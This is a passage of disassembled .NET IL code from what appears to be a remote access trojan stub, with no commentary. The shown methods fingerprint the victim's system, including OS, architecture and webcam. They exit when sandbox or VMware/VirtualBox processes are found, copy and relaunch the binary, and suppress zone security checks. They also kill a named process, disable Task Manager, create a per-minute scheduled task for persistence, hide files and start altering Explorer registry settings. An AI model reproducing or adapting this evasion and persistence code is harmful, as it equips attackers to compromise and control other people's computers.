      IL_0194:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0199:  ldloc.0
      IL_019a:  ldstr      "\?\?-\?\?-\?\?"
      IL_019f:  ldsfld     string j.OK::Y
      IL_01a4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01a9:  stloc.0
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b4:  leave.s    IL_01b6

    }  // end handler
    IL_01b6:  ldloc.0
    IL_01b7:  ldsfld     string j.OK::Y
    IL_01bc:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01c1:  stloc.0
    .try
    {
      IL_01c2:  ldloc.0
      IL_01c3:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01c8:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_01cd:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_01d2:  ldstr      "Microsoft"
      IL_01d7:  ldstr      ""
      IL_01dc:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01e1:  ldstr      "Windows"
      IL_01e6:  ldstr      "Win"
      IL_01eb:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01f0:  ldstr      bytearray (AE 00 ) 
      IL_01f5:  ldstr      ""
      IL_01fa:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ff:  ldstr      bytearray (22 21 )                                           // "!
      IL_0204:  ldstr      ""
      IL_0209:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_020e:  ldstr      "  "
      IL_0213:  ldstr      " "
      IL_0218:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_021d:  ldstr      " Win"
      IL_0222:  ldstr      "Win"
      IL_0227:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_022c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0231:  stloc.0
      IL_0232:  leave.s    IL_025b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0234:  dup
      IL_0235:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_023a:  stloc.s    V_9
      IL_023c:  ldloc.s    V_9
      IL_023e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0243:  ldloc.0
      IL_0244:  ldstr      "\?\?"
      IL_0249:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_024e:  stloc.0
      IL_024f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0254:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0259:  leave.s    IL_025b

    }  // end handler
    IL_025b:  ldloc.0
    IL_025c:  ldstr      "SP"
    IL_0261:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0266:  stloc.0
    .try
    {
      IL_0267:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_026c:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_0271:  ldstr      " "
      IL_0276:  ldc.i4.m1
      IL_0277:  ldc.i4.0
      IL_0278:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_027d:  stloc.s    V_10
      IL_027f:  ldloc.s    V_10
      IL_0281:  ldlen
      IL_0282:  conv.i4
      IL_0283:  ldc.i4.1
      IL_0284:  bne.un.s   IL_0292

      IL_0286:  ldloc.0
      IL_0287:  ldstr      "0"
      IL_028c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0291:  stloc.0
      IL_0292:  ldloc.0
      IL_0293:  ldloc.s    V_10
      IL_0295:  ldloc.s    V_10
      IL_0297:  ldlen
      IL_0298:  conv.i4
      IL_0299:  ldc.i4.1
      IL_029a:  sub.ovf
      IL_029b:  ldelem.ref
      IL_029c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02a1:  stloc.0
      IL_02a2:  leave.s    IL_02cb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a4:  dup
      IL_02a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02aa:  stloc.s    V_11
      IL_02ac:  ldloc.s    V_11
      IL_02ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02b3:  ldloc.0
      IL_02b4:  ldstr      "0"
      IL_02b9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02be:  stloc.0
      IL_02bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c9:  leave.s    IL_02cb

    }  // end handler
    IL_02cb:  nop
    .try
    {
      IL_02cc:  ldc.i4.s   38
      IL_02ce:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02d3:  ldstr      "x86"
      IL_02d8:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02dd:  brfalse.s  IL_02f2

      IL_02df:  ldloc.0
      IL_02e0:  ldstr      " x64"
      IL_02e5:  ldsfld     string j.OK::Y
      IL_02ea:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02ef:  stloc.0
      IL_02f0:  br.s       IL_0303

      IL_02f2:  ldloc.0
      IL_02f3:  ldstr      " x86"
      IL_02f8:  ldsfld     string j.OK::Y
      IL_02fd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0302:  stloc.0
      IL_0303:  leave.s    IL_032c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0305:  dup
      IL_0306:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_030b:  stloc.s    V_12
      IL_030d:  ldloc.s    V_12
      IL_030f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0314:  ldloc.0
      IL_0315:  ldsfld     string j.OK::Y
      IL_031a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_031f:  stloc.0
      IL_0320:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0325:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_032a:  leave.s    IL_032c

    }  // end handler
    IL_032c:  call       bool j.OK::Cam()
    IL_0331:  brfalse.s  IL_0346

    IL_0333:  ldloc.0
    IL_0334:  ldstr      "Yes"
    IL_0339:  ldsfld     string j.OK::Y
    IL_033e:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0343:  stloc.0
    IL_0344:  br.s       IL_0357

    IL_0346:  ldloc.0
    IL_0347:  ldstr      "No"
    IL_034c:  ldsfld     string j.OK::Y
    IL_0351:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0356:  stloc.0
    IL_0357:  ldc.i4.7
    IL_0358:  newarr     [mscorlib]System.String
    IL_035d:  dup
    IL_035e:  ldc.i4.0
    IL_035f:  ldloc.0
    IL_0360:  stelem.ref
    IL_0361:  dup
    IL_0362:  ldc.i4.1
    IL_0363:  ldsfld     string j.OK::VR
    IL_0368:  stelem.ref
    IL_0369:  dup
    IL_036a:  ldc.i4.2
    IL_036b:  ldsfld     string j.OK::Y
    IL_0370:  stelem.ref
    IL_0371:  dup
    IL_0372:  ldc.i4.3
    IL_0373:  ldstr      ".."
    IL_0378:  stelem.ref
    IL_0379:  dup
    IL_037a:  ldc.i4.4
    IL_037b:  ldsfld     string j.OK::Y
    IL_0380:  stelem.ref
    IL_0381:  dup
    IL_0382:  ldc.i4.5
    IL_0383:  call       string j.OK::ACT()
    IL_0388:  stelem.ref
    IL_0389:  dup
    IL_038a:  ldc.i4.6
    IL_038b:  ldsfld     string j.OK::Y
    IL_0390:  stelem.ref
    IL_0391:  call       string [mscorlib]System.String::Concat(string[])
    IL_0396:  stloc.0
    IL_0397:  ldstr      ""
    IL_039c:  stloc.1
    .try
    {
      IL_039d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_03a2:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_03a7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_03ac:  ldstr      "Software\\"
      IL_03b1:  ldsfld     string j.OK::RG
      IL_03b6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_03bb:  ldc.i4.0
      IL_03bc:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_03c1:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_03c6:  stloc.s    V_14
      IL_03c8:  ldc.i4.0
      IL_03c9:  stloc.s    V_15
      IL_03cb:  br.s       IL_03f3

      IL_03cd:  ldloc.s    V_14
      IL_03cf:  ldloc.s    V_15
      IL_03d1:  ldelem.ref
      IL_03d2:  stloc.s    V_13
      IL_03d4:  ldloc.s    V_13
      IL_03d6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_03db:  ldc.i4.s   32
      IL_03dd:  bne.un.s   IL_03ed

      IL_03df:  ldloc.1
      IL_03e0:  ldloc.s    V_13
      IL_03e2:  ldstr      ","
      IL_03e7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_03ec:  stloc.1
      IL_03ed:  ldloc.s    V_15
      IL_03ef:  ldc.i4.1
      IL_03f0:  add.ovf
      IL_03f1:  stloc.s    V_15
      IL_03f3:  ldloc.s    V_15
      IL_03f5:  ldloc.s    V_14
      IL_03f7:  ldlen
      IL_03f8:  conv.i4
      IL_03f9:  blt.s      IL_03cd

      IL_03fb:  leave.s    IL_0418

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03fd:  dup
      IL_03fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0403:  stloc.s    V_16
      IL_0405:  ldloc.s    V_16
      IL_0407:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_040c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0411:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0416:  leave.s    IL_0418

    }  // end handler
    IL_0418:  ldloc.0
    IL_0419:  ldloc.1
    IL_041a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_041f:  ret
  } // end of method OK::inf

  .method public static void  INS() cil managed noinlining nooptimization
  {
    // Code size       1314 (0x522)
    .maxstack  5
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             int32 V_1,
             class [System]System.Diagnostics.Process[] V_2,
             int32 V_3,
             class [System]System.Diagnostics.Process[] V_4,
             int32 V_5,
             class [System]System.Diagnostics.Process[] V_6,
             int32 V_7,
             uint8[] V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.Exception V_15)
    IL_0000:  ldc.i4     0x3e8
    IL_0005:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000a:  ldsfld     int32 j.OK::Slp
    IL_000f:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0014:  ldsfld     bool j.OK::ANYRUN
    IL_0019:  brfalse.s  IL_0049

    IL_001b:  call       string [mscorlib]System.Environment::get_UserName()
    IL_0020:  ldstr      "admin"
    IL_0025:  ldc.i4.0
    IL_0026:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_002b:  ldc.i4.0
    IL_002c:  ceq
    IL_002e:  call       string [System.Windows.Forms]System.Windows.Forms.SystemInformation::get_ComputerName()
    IL_0033:  ldstr      "USER-PC"
    IL_0038:  ldc.i4.0
    IL_0039:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_003e:  ldc.i4.0
    IL_003f:  ceq
    IL_0041:  and
    IL_0042:  brfalse.s  IL_0049

    IL_0044:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0049:  ldsfld     bool j.OK::VMWare
    IL_004e:  brfalse.s  IL_0094

    IL_0050:  ldstr      "vmtoolsd"
    IL_0055:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_005a:  stloc.0
    IL_005b:  ldc.i4.0
    IL_005c:  stloc.1
    IL_005d:  br.s       IL_006c

    IL_005f:  ldloc.0
    IL_0060:  ldloc.1
    IL_0061:  ldelem.ref
    IL_0062:  pop
    IL_0063:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0068:  ldloc.1
    IL_0069:  ldc.i4.1
    IL_006a:  add.ovf
    IL_006b:  stloc.1
    IL_006c:  ldloc.1
    IL_006d:  ldloc.0
    IL_006e:  ldlen
    IL_006f:  conv.i4
    IL_0070:  blt.s      IL_005f

    IL_0072:  ldstr      "vm3dservice"
    IL_0077:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_007c:  stloc.2
    IL_007d:  ldc.i4.0
    IL_007e:  stloc.3
    IL_007f:  br.s       IL_008e

    IL_0081:  ldloc.2
    IL_0082:  ldloc.3
    IL_0083:  ldelem.ref
    IL_0084:  pop
    IL_0085:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_008a:  ldloc.3
    IL_008b:  ldc.i4.1
    IL_008c:  add.ovf
    IL_008d:  stloc.3
    IL_008e:  ldloc.3
    IL_008f:  ldloc.2
    IL_0090:  ldlen
    IL_0091:  conv.i4
    IL_0092:  blt.s      IL_0081

    IL_0094:  ldsfld     bool j.OK::VirtualBOX
    IL_0099:  brfalse.s  IL_00ef

    IL_009b:  ldstr      "VGAuthService"
    IL_00a0:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00a5:  stloc.s    V_4
    IL_00a7:  ldc.i4.0
    IL_00a8:  stloc.s    V_5
    IL_00aa:  br.s       IL_00bd

    IL_00ac:  ldloc.s    V_4
    IL_00ae:  ldloc.s    V_5
    IL_00b0:  ldelem.ref
    IL_00b1:  pop
    IL_00b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00b7:  ldloc.s    V_5
    IL_00b9:  ldc.i4.1
    IL_00ba:  add.ovf
    IL_00bb:  stloc.s    V_5
    IL_00bd:  ldloc.s    V_5
    IL_00bf:  ldloc.s    V_4
    IL_00c1:  ldlen
    IL_00c2:  conv.i4
    IL_00c3:  blt.s      IL_00ac

    IL_00c5:  ldstr      "VBoxService"
    IL_00ca:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00cf:  stloc.s    V_6
    IL_00d1:  ldc.i4.0
    IL_00d2:  stloc.s    V_7
    IL_00d4:  br.s       IL_00e7

    IL_00d6:  ldloc.s    V_6
    IL_00d8:  ldloc.s    V_7
    IL_00da:  ldelem.ref
    IL_00db:  pop
    IL_00dc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00e1:  ldloc.s    V_7
    IL_00e3:  ldc.i4.1
    IL_00e4:  add.ovf
    IL_00e5:  stloc.s    V_7
    IL_00e7:  ldloc.s    V_7
    IL_00e9:  ldloc.s    V_6
    IL_00eb:  ldlen
    IL_00ec:  conv.i4
    IL_00ed:  blt.s      IL_00d6

    IL_00ef:  ldsfld     bool j.OK::Idr
    IL_00f4:  brfalse    IL_0210

    IL_00f9:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_00fe:  ldsfld     string j.OK::DR
    IL_0103:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0108:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_010d:  ldstr      "\\"
    IL_0112:  ldsfld     string j.OK::EXE
    IL_0117:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_011c:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0121:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0126:  call       bool j.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                            class [mscorlib]System.IO.FileInfo)
    IL_012b:  brtrue     IL_0210

    .try
    {
      IL_0130:  ldsfld     string j.OK::DR
      IL_0135:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_013a:  ldstr      "\\"
      IL_013f:  ldsfld     string j.OK::EXE
      IL_0144:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0149:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_014e:  brfalse.s  IL_016e

      IL_0150:  ldsfld     string j.OK::DR
      IL_0155:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_015a:  ldstr      "\\"
      IL_015f:  ldsfld     string j.OK::EXE
      IL_0164:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0169:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_016e:  ldsfld     string j.OK::DR
      IL_0173:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0178:  ldstr      "\\"
      IL_017d:  ldsfld     string j.OK::EXE
      IL_0182:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0187:  ldc.i4.1
      IL_0188:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_018d:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0192:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0197:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_019c:  stloc.s    V_8
      IL_019e:  dup
      IL_019f:  ldloc.s    V_8
      IL_01a1:  ldc.i4.0
      IL_01a2:  ldloc.s    V_8
      IL_01a4:  ldlen
      IL_01a5:  conv.i4
      IL_01a6:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_01ab:  dup
      IL_01ac:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_01b1:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_01b6:  ldsfld     string j.OK::DR
      IL_01bb:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_01c0:  ldstr      "\\"
      IL_01c5:  ldsfld     string j.OK::EXE
      IL_01ca:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01cf:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_01d4:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01d9:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01de:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01e3:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_01e8:  pop
      IL_01e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_01ee:  leave.s    IL_0210

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01f0:  dup
      IL_01f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f6:  stloc.s    V_9
      IL_01f8:  ldloc.s    V_9
      IL_01fa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0204:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0209:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_020e:  leave.s    IL_0210

    }  // end handler
    IL_0210:  nop
    .try
    {
      IL_0211:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_0216:  ldstr      "1"
      IL_021b:  ldc.i4.1
      IL_021c:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_0221:  leave.s    IL_023e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0223:  dup
      IL_0224:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0229:  stloc.s    V_10
      IL_022b:  ldloc.s    V_10
      IL_022d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0232:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0237:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_023c:  leave.s    IL_023e

    }  // end handler
    IL_023e:  ldsfld     bool j.OK::KProc
    IL_0243:  brfalse.s  IL_0261

    IL_0245:  ldstr      "taskkill /f im "
    IL_024a:  ldsfld     string j.OK::Proc
    IL_024f:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0254:  ldc.i4.0
    IL_0255:  ldc.i4.1
    IL_0256:  ldc.i4     0x1388
    IL_025b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_0260:  pop
    IL_0261:  ldsfld     bool j.OK::TaskMGR
    IL_0266:  brfalse.s  IL_026d

    IL_0268:  call       void Stub.NoTsk::Start()
    IL_026d:  ldsfld     bool j.OK::Sched
    IL_0272:  brfalse    IL_02ff

    .try
    {
      IL_0277:  ldstr      "schtasks /delete /tn \""
      IL_027c:  ldsfld     string j.OK::SCHEDNAME
      IL_0281:  ldstr      "\" /f"
      IL_0286:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_028b:  ldc.i4.0
      IL_028c:  ldc.i4.1
      IL_028d:  ldc.i4     0x1388
      IL_0292:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0297:  pop
      IL_0298:  ldc.i4.5
      IL_0299:  newarr     [mscorlib]System.String
      IL_029e:  dup
      IL_029f:  ldc.i4.0
      IL_02a0:  ldstr      "schtasks /create /sc minute /mo 1 /tn \""
      IL_02a5:  stelem.ref
      IL_02a6:  dup
      IL_02a7:  ldc.i4.1
      IL_02a8:  ldsfld     string j.OK::SCHEDNAME
      IL_02ad:  stelem.ref
      IL_02ae:  dup
      IL_02af:  ldc.i4.2
      IL_02b0:  ldstr      "\" /tr "
      IL_02b5:  stelem.ref
      IL_02b6:  dup
      IL_02b7:  ldc.i4.3
      IL_02b8:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_02bd:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_02c2:  stelem.ref
      IL_02c3:  dup
      IL_02c4:  ldc.i4.4
      IL_02c5:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_02ca:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_02cf:  stelem.ref
      IL_02d0:  call       string [mscorlib]System.String::Concat(string[])
      IL_02d5:  ldc.i4.0
      IL_02d6:  ldc.i4.1
      IL_02d7:  ldc.i4     0x1388
      IL_02dc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_02e1:  pop
      IL_02e2:  leave.s    IL_02ff

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02e4:  dup
      IL_02e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02ea:  stloc.s    V_11
      IL_02ec:  ldloc.s    V_11
      IL_02ee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02f3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02fd:  leave.s    IL_02ff

    }  // end handler
    IL_02ff:  ldsfld     bool j.OK::Ghost
    IL_0304:  brfalse.s  IL_0381

    .try
    {
      IL_0306:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_030b:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0310:  ldc.i4.2
      IL_0311:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::SetAttr(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
      IL_0316:  leave.s    IL_0324

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0318:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_031d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0322:  leave.s    IL_0324

    }  // end handler
    IL_0324:  nop
    .try
    {
      IL_0325:  ldc.i4.7
      IL_0326:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_032b:  ldstr      "\\"
      IL_0330:  ldsfld     string j.OK::RG
      IL_0335:  ldstr      ".exe"
      IL_033a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_033f:  ldc.i4.2
      IL_0340:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::SetAttr(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
      IL_0345:  leave.s    IL_0353

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0347:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_034c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0351:  leave.s    IL_0353

    }  // end handler
    IL_0353:  nop
    .try
    {
      IL_0354:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0359:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_035e:  ldstr      "HKEY_CURRENT_USER\\software\\Microsoft\\Windows\\Curre"
      + "ntVersion\\Explorer\\Advanced"
